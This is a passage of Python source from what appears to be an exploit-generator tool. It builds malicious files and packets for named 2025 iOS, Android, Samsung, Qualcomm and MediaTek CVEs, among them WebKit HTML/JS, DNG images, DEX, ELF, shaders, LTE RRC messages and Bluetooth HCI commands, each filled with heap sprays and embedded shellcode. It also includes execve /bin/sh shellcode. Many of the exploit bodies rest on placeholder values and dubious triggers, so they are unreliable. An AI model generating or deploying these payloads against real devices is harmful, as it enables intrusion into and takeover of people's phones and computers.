        code += b'\x00' * (512 - len(code))
        code += shellcode
        code += b'\x00' * (0x1000 - len(code))

        dylib += code
        dylib += b'\x00' * (0x4000 - len(dylib))

        return dylib

    def _cve_2025_24201_webkit(self, shellcode):
        """
        CVE-2025-24201: iOS WebKit out-of-bounds write

        Vulnerability: Out-of-bounds write in WebKit browser engine.
        Malicious web content can break out of Web Content sandbox.

        Target: iOS before 18.3.2, iPadOS before 18.3.2, Safari before 18.3.1
        Impact: Sandbox escape enabling further exploitation (actively exploited)
        CVSS: 8.8 (HIGH)
        Status: Exploited in "extremely sophisticated" targeted attacks
        """
        # Malicious HTML/JavaScript triggering WebKit OOB write

        html = b'<!DOCTYPE html>\n<html>\n<head>\n'
        html += b'<meta charset="UTF-8">\n'
        html += b'<title>Exploit</title>\n'
        html += b'</head>\n<body>\n'
        html += b'<script>\n'

        # JavaScript exploit code
        js = b'''
        // CVE-2025-24201: WebKit OOB Write Exploit

        // Create array buffer for heap spray
        var buffers = [];
        for (var i = 0; i < 1000; i++) {
            buffers.push(new ArrayBuffer(0x1000));
        }

        // Trigger WebKit OOB write vulnerability
        // This would involve complex JavaScript operations on:
        // - TypedArrays
        // - ArrayBuffers
        // - JIT compiler edge cases

        var victim = new Uint32Array(0x100);
        var oob_array = new Uint32Array(0xFFFFFFFF); // Malformed size

        // Trigger OOB write through array operations
        try {
            for (var i = 0; i < 0x200; i++) {
                // Write beyond bounds
                oob_array[i] = 0x41414141;
            }
        } catch(e) {}

        // Spray heap with shellcode
        var shellcode_arr = new Uint8Array([
        '''

        # Embed shellcode in JavaScript array
        js += b'    '
        for i, byte in enumerate(shellcode[:256]):
            js += b'0x%02x,' % byte
            if (i + 1) % 16 == 0:
                js += b'\n    '

        js += b'''
        ]);

        // Corrupt object metadata to achieve code execution
        var corrupted_obj = {};
        var addr = 0x41424344; // Would be calculated dynamically

        // Trigger sandbox escape
        document.location = "file:///etc/passwd";

        </script>
        '''

        html += js
        html += b'\n</body>\n</html>'

        return html

    def _cve_2025_24200_usb_restrict(self, shellcode):
        """
        CVE-2025-24200: iOS USB Restricted Mode bypass

        Vulnerability: Authorization flaw allowing USB Restricted Mode disable.
        Requires physical access to locked device.

        Target: iOS before 18.3.2, iPadOS before 18.3.2
        Impact: Forensic bypass, enables further physical attacks
        CVSS: 5.5 (MEDIUM)
        Status: Used in targeted attacks (cyber-physical)
        """
        # Configuration profile (mobileconfig) that exploits USB Restricted Mode bypass

        # XML plist structure
        plist = b'<?xml version="1.0" encoding="UTF-8"?>\n'
        plist += b'<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" '
        plist += b'"http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n'
        plist += b'<plist version="1.0">\n'
        plist += b'<dict>\n'

        # Malicious configuration
        plist += b'  <key>PayloadContent</key>\n'
        plist += b'  <array>\n'
        plist += b'    <dict>\n'
        plist += b'      <key>PayloadType</key>\n'
        plist += b'      <string>com.apple.restrictionspasscode</string>\n'
        plist += b'      <key>PayloadVersion</key>\n'
        plist += b'      <integer>1</integer>\n'
        plist += b'      <key>PayloadIdentifier</key>\n'
        plist += b'      <string>com.exploit.usb.bypass</string>\n'
        plist += b'      <key>PayloadUUID</key>\n'
        plist += b'      <string>12345678-1234-1234-1234-123456789abc</string>\n'
        plist += b'      <key>PayloadDisplayName</key>\n'
        plist += b'      <string>USB Config</string>\n'

        # VULNERABILITY: Malformed USB Restricted Mode settings
        plist += b'      <key>allowUSBRestrictedMode</key>\n'
        plist += b'      <false/>\n'
        plist += b'      <key>forceUSBRestrictedMode</key>\n'
        plist += b'      <false/>\n'

        # Exploit timing vulnerability in state management
        plist += b'      <key>usbRestrictedModeTimeout</key>\n'
        plist += b'      <integer>-1</integer>\n'  # Negative timeout triggers vulnerability

        plist += b'    </dict>\n'
        plist += b'  </array>\n'

        plist += b'  <key>PayloadDisplayName</key>\n'
        plist += b'  <string>USB Bypass Profile</string>\n'
        plist += b'  <key>PayloadIdentifier</key>\n'
        plist += b'  <string>com.exploit.main</string>\n'
        plist += b'  <key>PayloadRemovalDisallowed</key>\n'
        plist += b'  <false/>\n'
        plist += b'  <key>PayloadType</key>\n'
        plist += b'  <string>Configuration</string>\n'
        plist += b'  <key>PayloadUUID</key>\n'
        plist += b'  <string>87654321-4321-4321-4321-cba987654321</string>\n'
        plist += b'  <key>PayloadVersion</key>\n'
        plist += b'  <integer>1</integer>\n'

        plist += b'</dict>\n'
        plist += b'</plist>\n'

        # Append shellcode as comment (would be processed by exploit chain)
        plist += b'\n<!-- Payload: '
        plist += shellcode.hex().encode()
        plist += b' -->\n'

        return plist

    # ======================================================================
    # 2025 ANDROID OVERFLOWS (10 CVEs)
    # ======================================================================

    def _cve_2025_48593_android_system(self, shellcode):
        """
        CVE-2025-48593: Android System zero-click RCE

        Vulnerability: Buffer overflow in privileged Android System component.
        Triggered by specially crafted network packet (zero-click).

        Target: Android 13, 14, 15, 16 (before 2025-11-01 patch)
        Impact: Zero-click remote code execution without user interaction
        CVSS: 9.8 (CRITICAL)
        Status: Pending exploitation (high risk for targeted attacks)
        """
        # Malicious Android Intent (AIDL) packet
        # This would be delivered via network service (ADB, NSD, etc.)

        intent = b''

        # Android Parcel structure for IPC
        intent += struct.pack('<I', 0x424E4441)  # Magic: 'ANDB' (Android Binder)
        intent += struct.pack('<I', 0x00000001)  # Protocol version
        intent += struct.pack('<I', 0x00000000)  # Flags

        # Intent data
        intent += struct.pack('<I', 0x00000001)  # Has intent extras
        intent += struct.pack('<I', 0xFFFFFFFF)  # Intent flags (ALL)

        # Component name (malicious)
        intent += struct.pack('<I', 52)  # String length (HUGE - triggers overflow!)
        intent += b'com.android.internal.system/'
        intent += b'ExploitService' * 10  # Overflow package name buffer
        intent += b'\x00' * 100

        # Extra data with buffer overflow
        intent += struct.pack('<I', 0x00000010)  # Type: BUNDLE
        intent += struct.pack('<I', 0xFFFFFFF0)  # Bundle size (HUGE!)

        # Heap spray with shellcode
        for i in range(100):
            intent += struct.pack('<I', 0x6e756f62)  # Type marker
            intent += struct.pack('<I', 256)  # Data length
            intent += shellcode[:256].ljust(256, b'\x90')  # NOP sled + shellcode

        # VULNERABILITY: Oversized parcel causes buffer overflow in system_server
        intent += struct.pack('<I', 0xDEADBEEF)  # Corruption marker
        intent += b'\x41' * 2048  # Overflow buffer

        return intent

    def _cve_2025_21042_samsung_dng(self, shellcode):
        """
        CVE-2025-21042: Samsung Android image processing DNG

        Vulnerability: Out-of-bounds write in libimagecodec.quram.so.
        Exploited by LANDFALL spyware via WhatsApp DNG images.

        Target: Samsung Galaxy S22, S23, S24, Z Fold4, Z Flip4 (before April 2025)
        Impact: Remote code execution via malicious DNG image
        CVSS: 8.8 (HIGH)
        Status: ACTIVELY EXPLOITED by commercial spyware
        """
        # DNG (Digital Negative) image format - Adobe RAW variant

        dng = b''

        # TIFF header (DNG is based on TIFF)
        dng += b'II'  # Little-endian
        dng += struct.pack('<H', 42)  # TIFF magic
        dng += struct.pack('<I', 8)  # IFD offset

        # IFD (Image File Directory)
        dng += struct.pack('<H', 15)  # Number of directory entries

        # Standard TIFF tags
        dng += struct.pack('<H', 256)  # ImageWidth tag
        dng += struct.pack('<H', 3)  # SHORT type
        dng += struct.pack('<I', 1)  # Count
        dng += struct.pack('<I', 4096)  # Width value

        dng += struct.pack('<H', 257)  # ImageLength tag
        dng += struct.pack('<H', 3)  # SHORT type
        dng += struct.pack('<I', 1)  # Count
        dng += struct.pack('<I', 3072)  # Height value

        # DNG-specific tags
        dng += struct.pack('<H', 50706)  # DNGVersion tag
        dng += struct.pack('<H', 1)  # BYTE type
        dng += struct.pack('<I', 4)  # Count
        dng += struct.pack('<I', 0x01040000)  # Version 1.4.0.0

        # VULNERABILITY: Malformed CFA (Color Filter Array) pattern
        dng += struct.pack('<H', 33422)  # CFAPattern tag
        dng += struct.pack('<H', 1)  # BYTE type
        dng += struct.pack('<I', 0xFFFFFFFF)  # Count (HUGE - triggers overflow!)
        dng += struct.pack('<I', 2048)  # Offset to CFA data

        # Malformed LinearizationTable
        dng += struct.pack('<H', 50712)  # LinearizationTable tag
        dng += struct.pack('<H', 4)  # LONG type
        dng += struct.pack('<I', 0xFFFFFFF0)  # Count (OVERSIZED!)
        dng += struct.pack('<I', 4096)  # Offset

        dng += struct.pack('<I', 0)  # Next IFD offset (none)

        # Pad to offset 2048
        dng += b'\x00' * (2048 - len(dng))

        # CFA pattern data - OVERFLOW HERE!
        # Samsung libimagecodec.quram.so doesn't validate CFA size
        dng += b'\x02\x01\x01\x00' * 100  # Bayer pattern repeated
        dng += shellcode[:1024].ljust(1024, b'\x90')  # Shellcode in overflow

        # Pad to offset 4096
        dng += b'\x00' * (4096 - len(dng))

        # Linearization table - secondary overflow
        for i in range(1000):
            dng += struct.pack('<I', 0x41414141)  # Heap spray

        dng += shellcode * 10  # Multiple shellcode copies

        # Append ZIP archive (LANDFALL spyware delivery mechanism)
        dng += b'\x50\x4B\x03\x04'  # ZIP local file header
        dng += b'\x14\x00\x00\x00\x08\x00'  # Version, flags, compression
        dng += b'\x00' * 18  # Timestamps, CRC, sizes
        dng += struct.pack('<H', 4)  # Filename length
        dng += b'\x00\x00'  # Extra field length
        dng += b'b.so'  # Loader filename (LANDFALL component)
        dng += shellcode  # Embedded payload

        return dng

    def _cve_2025_21043_samsung_oob(self, shellcode):
        """
        CVE-2025-21043: Samsung Android out-of-bounds write

        Vulnerability: OOB write in Samsung Android component.
        Can result in arbitrary code execution.

        Target: Samsung Android devices (before September 2025)
        Impact: Arbitrary code execution
        CVSS: 8.8 (HIGH)
        Status: Patched in September 2025
        """
        # Malicious APK AndroidManifest.xml with oversized elements

        manifest = b''

        # Android Binary XML header
        manifest += struct.pack('<I', 0x00080003)  # RES_XML_TYPE
        manifest += struct.pack('<I', 8)  # Header size
        manifest += struct.pack('<I', 0xFFFFFF)  # Total size (HUGE!)

        # String pool
        manifest += struct.pack('<I', 0x001C0001)  # RES_STRING_POOL_TYPE
        manifest += struct.pack('<I', 28)  # Header size
        manifest += struct.pack('<I', 5000)  # Pool size (OVERSIZED!)
        manifest += struct.pack('<I', 100)  # String count
        manifest += struct.pack('<I', 0)  # Style count
        manifest += struct.pack('<I', 0)  # Flags
        manifest += struct.pack('<I', 0x100)  # Strings start
        manifest += struct.pack('<I', 0)  # Styles start

        # String offsets - VULNERABILITY: oversized offsets cause OOB
        for i in range(100):
            manifest += struct.pack('<I', 0xFFFFFFF0 + i * 4)  # Huge offset!

        # Actual strings (would be read out-of-bounds)
        manifest += b'android\x00'
        manifest += b'com.exploit.samsung\x00'
        manifest += b'MainActivity\x00'

        # Pad to make oversized pool
        manifest += b'\x00' * 4000
        manifest += shellcode * 10  # Heap spray

        # Manifest elements
        manifest += struct.pack('<I', 0x00100102)  # RES_XML_START_ELEMENT_TYPE
        manifest += struct.pack('<I', 16)  # Size
        manifest += struct.pack('<I', 0xFFFFFFFF)  # Line number (invalid)
        manifest += struct.pack('<I', 0xFFFFFFFF)  # Comment (invalid)

        return manifest

    def _cve_2025_38352_kernel_race(self, shellcode):
        """
        CVE-2025-38352: Linux kernel POSIX CPU timers race condition

        Vulnerability: Race condition between handle_posix_cpu_timers()
        and posix_cpu_timer_del() in kernel's timer subsystem.

        Target: Android 13-16 with Linux kernel < 6.12.35
        Impact: Local privilege escalation, kernel destabilization
        CVSS: 7.4 (HIGH)
        Status: ACTIVELY EXPLOITED (reported by Google TAG)
        """
        # Native Linux executable (ELF) that triggers kernel race

        elf = b''

        # ELF header (64-bit ARM)
        elf += b'\x7FELF'  # Magic
        elf += struct.pack('B', 2)  # 64-bit
        elf += struct.pack('B', 1)  # Little-endian
        elf += struct.pack('B', 1)  # ELF version
        elf += b'\x00' * 9  # Padding
        elf += struct.pack('<H', 2)  # ET_EXEC
        elf += struct.pack('<H', 0xB7)  # EM_AARCH64
        elf += struct.pack('<I', 1)  # Version
        elf += struct.pack('<Q', 0x400000)  # Entry point
        elf += struct.pack('<Q', 64)  # Program header offset
        elf += struct.pack('<Q', 0)  # Section header offset
        elf += struct.pack('<I', 0)  # Flags
        elf += struct.pack('<H', 64)  # ELF header size
        elf += struct.pack('<H', 56)  # Program header size
        elf += struct.pack('<H', 1)  # Number of program headers
        elf += struct.pack('<H', 0)  # Section header size
        elf += struct.pack('<H', 0)  # Number of section headers
        elf += struct.pack('<H', 0)  # Section name string table index

        # Program header (LOAD)
        elf += struct.pack('<I', 1)  # PT_LOAD
        elf += struct.pack('<I', 5)  # PF_R | PF_X
        elf += struct.pack('<Q', 0x1000)  # Offset
        elf += struct.pack('<Q', 0x400000)  # Virtual address
        elf += struct.pack('<Q', 0x400000)  # Physical address
        elf += struct.pack('<Q', 0x1000)  # File size
        elf += struct.pack('<Q', 0x1000)  # Memory size
        elf += struct.pack('<Q', 0x1000)  # Alignment

        # Pad to code offset
        elf += b'\x00' * (0x1000 - len(elf))

        # ARM64 code to exploit POSIX CPU timer race
        # This creates multiple threads that race to create/delete timers
        code = b''

        # timer_create syscall (create POSIX CPU timer)
        code += b'\x88\x02\x80\xD2'  # mov x8, #0x14 (timer_create)
        code += b'\x00\x00\x80\xD2'  # mov x0, #CLOCK_PROCESS_CPUTIME_ID
        code += b'\xE1\x03\x1F\xAA'  # mov x1, xzr (sigevent)
        code += b'\x01\x00\x00\xD4'  # svc #0 (syscall)

        # VULNERABILITY: Race between timer_create and timer_delete
        # Rapid creation/deletion triggers use-after-free in kernel

        # timer_delete syscall loop
        code += b'\x29\x02\x80\xD2'  # mov x9, #0x11 (timer_delete)
        code += b'\xE8\x03\x00\xAA'  # mov x8, x0 (timer ID)
        code += b'\x01\x00\x00\xD4'  # svc #0

        # Jump back to create loop (race condition)
        code += b'\xF0\xFF\xFF\x17'  # b -64 (loop)

        elf += code.ljust(256, b'\x90')  # NOP sled
        elf += shellcode  # Payload executes after kernel corruption

        return elf

    def _cve_2025_48543_runtime_uaf(self, shellcode):
        """
        CVE-2025-48543: Android Runtime use-after-free

        Vulnerability: UAF in Android Runtime (ART) component.
        Allows sandbox escape without user interaction.

        Target: Android 13-16 (before 2025-09-05 patch)
        Impact: Local privilege escalation, sandbox bypass
        CVSS: 7.8 (HIGH)
        Status: ACTIVELY EXPLOITED (observed in the wild)
        """
        # Malicious DEX (Dalvik Executable) file

        dex = b''

        # DEX header
        dex += b'dex\n039\x00'  # Magic + version
        dex += struct.pack('<I', 0x12345678)  # Checksum (would be calculated)
        dex += b'\x00' * 20  # SHA-1 signature
        dex += struct.pack('<I', 10000)  # File size
        dex += struct.pack('<I', 0x70)  # Header size
        dex += struct.pack('<I', 0x12345678)  # Endian tag
        dex += struct.pack('<I', 0)  # Link size
        dex += struct.pack('<I', 0)  # Link offset
        dex += struct.pack('<I', 0x1000)  # Map offset
        dex += struct.pack('<I', 100)  # String IDs size
        dex += struct.pack('<I', 0x200)  # String IDs offset
        dex += struct.pack('<I', 50)  # Type IDs size
        dex += struct.pack('<I', 0x400)  # Type IDs offset
        dex += struct.pack('<I', 20)  # Proto IDs size
        dex += struct.pack('<I', 0x600)  # Proto IDs offset
        dex += struct.pack('<I', 10)  # Field IDs size
        dex += struct.pack('<I', 0x800)  # Field IDs offset
        dex += struct.pack('<I', 30)  # Method IDs size
        dex += struct.pack('<I', 0xA00)  # Method IDs offset
        dex += struct.pack('<I', 5)  # Class defs size
        dex += struct.pack('<I', 0xC00)  # Class defs offset
        dex += struct.pack('<I', 0xFFFFFFFF)  # Data size (HUGE!)
        dex += struct.pack('<I', 0xE00)  # Data offset

        # Pad to offset 0x200
        dex += b'\x00' * (0x200 - len(dex))

        # String IDs - VULNERABILITY: malformed string offsets
        for i in range(100):
            dex += struct.pack('<I', 0xFFFFFFF0 + i)  # Huge offset (UAF trigger)

        # Pad to offset 0x400
        dex += b'\x00' * (0x400 - len(dex))

        # Type IDs - references to freed memory
        for i in range(50):
            dex += struct.pack('<I', 0xDEADBEEF)  # Dangling pointer

        # Pad to data section
        dex += b'\x00' * (0xE00 - len(dex))

        # Data section with heap spray
        for i in range(100):
            dex += shellcode[:256].ljust(256, b'\x90')

        # ART JIT compiler will process this and trigger UAF
        # when accessing freed string/type objects

        return dex

    def _cve_2025_21479_qualcomm_gpu(self, shellcode):
        """
        CVE-2025-21479: Qualcomm Adreno GPU memory corruption

        Vulnerability: Incorrect authorization in Adreno GPU microcode.
        Memory corruption via unauthorized GPU command execution.

        Target: Qualcomm Adreno GPUs (before August 2025 patch)
        Impact: Privilege escalation to system level via GPU
        CVSS: 8.6 (HIGH)
        Status: ACTIVELY EXPLOITED (commercial spyware suspected)
        """
        # Malicious OpenGL ES shader with GPU exploit

        shader = b''

        # SPIR-V binary (Vulkan/OpenGL shader IR)
        shader += struct.pack('<I', 0x07230203)  # Magic number
        shader += struct.pack('<I', 0x00010000)  # Version 1.0
        shader += struct.pack('<I', 0x00000000)  # Generator
        shader += struct.pack('<I', 1000)  # Bound
        shader += struct.pack('<I', 0)  # Schema

        # OpCapability Shader
        shader += struct.pack('<I', 0x00020011)
        shader += struct.pack('<I', 1)  # Shader capability

        # OpMemoryModel
        shader += struct.pack('<I', 0x0003000E)
        shader += struct.pack('<I', 0)  # Logical addressing
        shader += struct.pack('<I', 1)  # GLSL450 memory model

        # OpEntryPoint
        shader += struct.pack('<I', 0x0004000F)
        shader += struct.pack('<I', 5)  # Fragment shader
        shader += struct.pack('<I', 1)  # Entry point ID
        shader += b'main\x00'

        # VULNERABILITY: Malicious OpLoad with out-of-bounds buffer ID
        shader += struct.pack('<I', 0x0005003D)  # OpLoad
        shader += struct.pack('<I', 100)  # Result type
        shader += struct.pack('<I', 101)  # Result ID
        shader += struct.pack('<I', 0xFFFFFFFF)  # Pointer ID (INVALID - OOB!)

        # Malicious OpStore to GPU memory
        shader += struct.pack('<I', 0x0004003E)  # OpStore
        shader += struct.pack('<I', 0xDEADBEEF)  # Pointer (unauthorized!)
        shader += struct.pack('<I', 102)  # Object ID

        # OpReturn
        shader += struct.pack('<I', 0x00010038)

        # OpFunctionEnd
        shader += struct.pack('<I', 0x00010056)

        # Pad and embed shellcode
        shader += b'\x00' * 256
        shader += shellcode * 5  # Multiple copies for heap spray

        # GPU will execute unauthorized commands, corrupting kernel memory

        return shader

    def _cve_2025_27038_qualcomm_uaf(self, shellcode):
        """
        CVE-2025-27038: Qualcomm Adreno GPU use-after-free

        Vulnerability: UAF in Adreno GPU driver during Chrome rendering.
        Memory corruption while rendering graphics.

        Target: Qualcomm Adreno GPUs (before August 2025 patch)
        Impact: Memory corruption, code execution via browser
        CVSS: 7.5 (HIGH)
        Status: ACTIVELY EXPLOITED (forensic tools suspected)
        """
        # HTML page with malicious Canvas/WebGL that triggers GPU UAF

        html = b'<!DOCTYPE html>\n<html>\n<head>\n'
        html += b'<title>GPU Exploit</title>\n</head>\n<body>\n'
        html += b'<canvas id="c" width="1920" height="1080"></canvas>\n'
        html += b'<script>\n'

        # JavaScript that triggers Adreno GPU UAF
        html += b'''
        var canvas = document.getElementById('c');
        var gl = canvas.getContext('webgl2');

        // Create and delete textures rapidly (UAF trigger)
        var textures = [];
        for (var i = 0; i < 10000; i++) {
            var tex = gl.createTexture();
            gl.bindTexture(gl.TEXTURE_2D, tex);
            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 4096, 4096, 0,
                         gl.RGBA, gl.UNSIGNED_BYTE, null);
            textures.push(tex);

            // Delete immediately (causes UAF in Adreno driver)
            if (i % 100 == 0) {
                for (var j = 0; j < textures.length; j++) {
                    gl.deleteTexture(textures[j]);
                }
                textures = [];
            }
        }

        // Trigger render with freed texture memory
        var buffer = gl.createBuffer();
        gl.bindBuffer(gl.ARRAY_BUFFER, buffer);

        // Large buffer allocation to spray heap
        var data = new Uint8Array('''

        # Embed shellcode in typed array
        html += str(len(shellcode) * 100).encode()
        html += b');\n'

        # Fill with shellcode pattern
        html += b'        for (var i = 0; i < data.length; i++) {\n'
        html += b'            data[i] = '
        html += str(shellcode[0] if shellcode else 0x90).encode()
        html += b';\n        }\n'

        html += b'''
        gl.bufferData(gl.ARRAY_BUFFER, data, gl.STATIC_DRAW);

        // Corrupt freed texture object
        gl.drawArrays(gl.TRIANGLES, 0, 0xFFFFFFFF);

        </script>
        </body></html>
        '''

        return html

    def _cve_2025_27363_android_rce(self, shellcode):
        """
        CVE-2025-27363: Android remote code execution

        Vulnerability: High-risk RCE in Android component.

        Target: Android devices (before May 2025 patch)
        Impact: Remote code execution
        CVSS: 8.1 (HIGH)
        Status: ACTIVELY EXPLOITED
        """
        # Malicious Android broadcast Intent

        intent = b''

        # Intent protocol buffer (serialized)
        intent += b'\x08\x01'  # Field 1: intent action (varint)
        intent += b'\x12'  # Field 2: component name (length-delimited)
        intent += struct.pack('B', 255)  # Length (OVERSIZED!)
        intent += b'com.android.internal.telephony/'
        intent += b'SmsReceiver' * 20  # Overflow component name

        # Extra data bundle
        intent += b'\x1A'  # Field 3: extras (length-delimited)
        intent += struct.pack('B', 255)  # Bundle length (HUGE!)

        # Serialized bundle with shellcode
        intent += b'\x00\x00\x00\x04'  # Bundle magic
        intent += struct.pack('<I', 10000)  # Bundle length
        intent += struct.pack('<I', 50)  # Number of items

        # Malicious bundle items
        for i in range(50):
            intent += b'\x00\x00\x00\x07'  # VAL_BYTEARRAY
            intent += struct.pack('<I', 256)  # Array length
            intent += shellcode[:256].ljust(256, b'\x41')

        return intent

    def _cve_2025_20708_mediatek_modem(self, shellcode):
        """
        CVE-2025-20708: MediaTek modem out-of-bounds write

        Vulnerability: OOB write in MediaTek modem subsystem.
        Remote PE via connection to rogue base station.

        Target: MediaTek chipsets (before 2025 patch)
        Impact: Remote privilege escalation without user interaction
        CVSS: 8.0+ (HIGH)
        Status: Rogue base station attacks possible
        """
        # Malicious LTE/5G RRC (Radio Resource Control) message

        rrc = b''

        # ASN.1 PER encoding (used in LTE/5G protocols)
        # RRC Connection Setup message
        rrc += b'\x00'  # Message type: RRCConnectionSetup
        rrc += b'\x01'  # Transaction ID

        # RadioResourceConfigDedicated
        rrc += b'\x80'  # Presence bitmap
        rrc += b'\xFF'  # All fields present

        # VULNERABILITY: Oversized SRB (Signaling Radio Bearer) config
        rrc += struct.pack('>H', 0xFFFF)  # SRB ID (INVALID!)
        rrc += struct.pack('>I', 0xFFFFFFFF)  # PDCP config length (HUGE!)

        # Malicious PDCP configuration
        for i in range(1000):
            rrc += b'\x41\x41\x41\x41'  # Heap spray

        # RLC configuration with OOB pointers
        rrc += struct.pack('>I', 0xDEADBEEF)  # Corrupted RLC pointer
        rrc += struct.pack('>I', 0xCAFEBABE)  # Another bad pointer

        # LogicalChannelConfig - triggers OOB write in modem firmware
        rrc += b'\xC0'  # Presence bits
        rrc += struct.pack('>H', 0xFFFF)  # Priority (invalid)
        rrc += struct.pack('>H', 0xFFFF)  # Bucket size (causes overflow)

        # Embed shellcode in message
        rrc += shellcode * 10

        # Modem firmware will parse this and write OOB
        # Leads to modem compromise, then escalation to AP (application processor)

        return rrc

    def _cve_2025_20672_mediatek_bt(self, shellcode):
        """
        CVE-2025-20672: MediaTek Bluetooth driver heap overflow

        Vulnerability: Heap overflow in MediaTek Bluetooth drivers.
        Elevation of privilege through BT stack.

        Target: MediaTek chipsets (before 2025 patch)
        Impact: Local privilege escalation via Bluetooth
        CVSS: 7.8 (HIGH)
        Status: Requires Bluetooth proximity
        """
        # Malicious Bluetooth HCI (Host Controller Interface) command

        hci = b''

        # HCI command packet
        hci += b'\x01'  # HCI Command packet type
        hci += struct.pack('<H', 0x0C03)  # OpCode: HCI_Reset (example)
        hci += b'\xFF'  # Parameter length (OVERSIZED for HCI_Reset!)

        # VULNERABILITY: HCI_Reset expects 0 bytes, but we send 255
        # MediaTek BT driver doesn't validate parameter length properly

        # Heap spray pattern
        for i in range(10):
            hci += shellcode[:25].ljust(25, b'\x90')

        # Add more malicious HCI commands
        hci += b'\x01'  # Command packet
        hci += struct.pack('<H', 0x0C13)  # OpCode: HCI_Write_Local_Name
        hci += b'\xF0'  # Parameter length (HUGE!)

        # Local name field overflow
        hci += b'MediaTek_Exploit_' * 10
        hci += shellcode * 5

        # BT AVRCP (Audio/Video Remote Control) exploit
        hci += b'\x01'  # Command
        hci += struct.pack('<H', 0x0400)  # AVRCP opcode
        hci += b'\xFF'  # Length

        # AVRCP metadata overflow
        hci += b'\x00' * 50  # AVRCP header
        hci += struct.pack('<I', 0xFFFFFFFF)  # Attribute length (overflow!)
        hci += shellcode * 3

        return hci

    def _make_chunk(self, name, data):
        """Create PNG chunk with proper CRC"""
        chunk = struct.pack('>I', len(data)) + name + data
        crc = self._crc32(name + data)
        return chunk + struct.pack('>I', crc)

    def _crc32(self, data):
        """Calculate CRC32 for PNG chunks"""
        import zlib
        return zlib.crc32(data) & 0xffffffff

    def generate_shellcode(self, payload_type='exec_sh'):
        """
        Generate shellcode payloads

        Args:
            payload_type: Type of shellcode (exec_sh, reverse_shell, download_exec)

        Returns:
            bytes: Shellcode
        """
        shellcodes = {
            # Execute /bin/sh
            'exec_sh': bytes([
                0x48, 0x31, 0xd2,                          # xor rdx, rdx
                0x48, 0xbb, 0x2f, 0x2f, 0x62, 0x69,        # mov rbx, '//bin/sh'
                0x6e, 0x2f, 0x73, 0x68,
                0x48, 0xc1, 0xeb, 0x08,                    # shr rbx, 8
                0x53,                                       # push rbx
                0x48, 0x89, 0xe7,                          # mov rdi, rsp
                0x50,                                       # push rax
                0x57,                                       # push rdi
                0x48, 0x89, 0xe6,                          # mov rsi, rsp
                0xb0, 0x3b,                                # mov al, 0x3b (execve)
                0x0f, 0x05                                 # syscall
            ]),

            # NOP sled (for testing)
            'nop_sled': b'\x90' * 128,

            # POC marker (non-executable, just marks successful overflow)
            'poc_marker': b'SHELLCODE_EXECUTED_HERE!' * 10,
        }

        return shellcodes.get(payload_type, shellcodes['poc_marker'])

    def get_supported_cves(self):
        """
        Get list of supported CVE IDs

        Returns:
            List of supported CVE ID strings
        """
        return sorted(self.exploits.keys())

    def validate_cve_id(self, cve_id: str) -> str:
        """
        Validate CVE ID

        Args:
            cve_id: CVE identifier to validate

        Returns:
            Validated CVE ID (normalized)

        Raises:
            ValidationError: If CVE ID is invalid
        """
        # Normalize CVE ID
        cve_normalized = cve_id.upper().strip()

        if cve_normalized not in self.exploits:
            supported = ', '.join(sorted(self.exploits.keys()))
            raise ValidationError(
                f"Unknown CVE ID: {cve_id}\n"
                f"Supported CVEs ({len(self.exploits)} total):\n"
                f"  {supported}"
            )

        return cve_normalized

    def generate_exploit(self, cve_id, output_path, payload_type='poc_marker', tui=None):
        """
        Generate exploit image

        Args:
            cve_id: CVE identifier
            output_path: Where to save exploit file
            payload_type: Type of shellcode payload
            tui: TUI helper instance (optional)

        Raises:
            ValidationError: If CVE ID is invalid
        """
        # Validate CVE ID
        try:
            cve_id = self.validate_cve_id(cve_id)
        except ValidationError as e:
            self.logger.error(f"CVE validation failed: {e}")
            raise

        # Initialize TUI if not provided
        if tui is None and TUI is not None:
            tui = TUI()

        # Generate shellcode
        if tui:
            tui.info(f"Generating {payload_type} shellcode...")
        shellcode = self.generate_shellcode(payload_type)

        # Generate exploit
        if tui:
            tui.info(f"Building {cve_id} exploit...")
        exploit_func = self.exploits[cve_id]
        exploit_data = exploit_func(shellcode)

        # Write to file
        if tui:
            tui.info(f"Writing to {output_path}...")
        with open(output_path, 'wb') as f:
            f.write(exploit_data)

        # Success message with TUI
        if tui:
            print()
            tui.success(f"Exploit generated successfully!", prefix="  ")
            print()
            tui.key_value("Output file", output_path, 20)
            tui.key_value("CVE ID", cve_id, 20)
            tui.key_value("Payload type", payload_type, 20)
            tui.key_value("File size", f"{len(exploit_data):,} bytes", 20)
            tui.key_value("Shellcode size", f"{len(shellcode):,} bytes", 20)
        else:
            # Fallback to plain output
            print(f"[+] Exploit generated: {output_path}")
            print(f"    CVE: {cve_id}")
            print(f"    Payload: {payload_type}")
            print(f"    Size: {len(exploit_data)} bytes")
            print(f"    Shellcode size: {len(shellcode)} bytes")

        # Target information
        targets = {
            # EXISTING
            'CVE-2015-8540': ('libpng 1.6.x - Buffer overflow in chunk name', 'high'),
            'CVE-2019-7317': ('libpng - Use-after-free in image handling', 'high'),
            'CVE-2018-14498': ('libjpeg - Heap buffer over-read', 'medium'),
            'CVE-2019-15133': ('giflib - Division by zero', 'medium'),
            'CVE-2016-3977': ('giflib - Heap buffer overflow', 'high'),

            # PRIORITY 1
            'CVE-2023-4863': ('libwebp 0.5.0-1.3.1 - Heap overflow in Huffman decoder (CRITICAL - ACTIVELY EXPLOITED)', 'critical'),
            'CVE-2024-10573': ('mpg123 <1.32.8 - Frankenstein stream heap overflow', 'critical'),
            'CVE-2023-52356': ('libtiff <4.7.0rc1 - Heap overflow in TIFFReadRGBATileExt', 'critical'),

            # PRIORITY 2
            'CVE-2017-8373': ('libmad 0.15.1b - Heap overflow in mad_layer_III', 'high'),
            'CVE-2006-0006': ('Windows Media Player 7.1/9/10 - BMP heap overflow', 'high'),
            'CVE-2020-22219': ('FLAC <1.4.0 - Buffer overflow in encoder', 'high'),
            'CVE-2020-0499': ('FLAC <1.3.4 - Heap OOB read in decoder', 'high'),
            'CVE-2008-1083': ('Windows GDI - EMF/WMF heap overflow', 'high'),
            'CVE-2005-4560': ('Windows GDI - WMF SETABORTPROC code execution', 'high'),

            # PRIORITY 3
            'CVE-2017-6827': ('audiofile 0.3.6 - MSADPCM heap overflow', 'medium'),
            'CVE-2018-5146': ('libvorbis - OGG Vorbis OOB write in codebook', 'high'),
            'CVE-2022-22675': ('AppleAVD (iOS/macOS) - Video accelerator buffer overflow', 'high'),
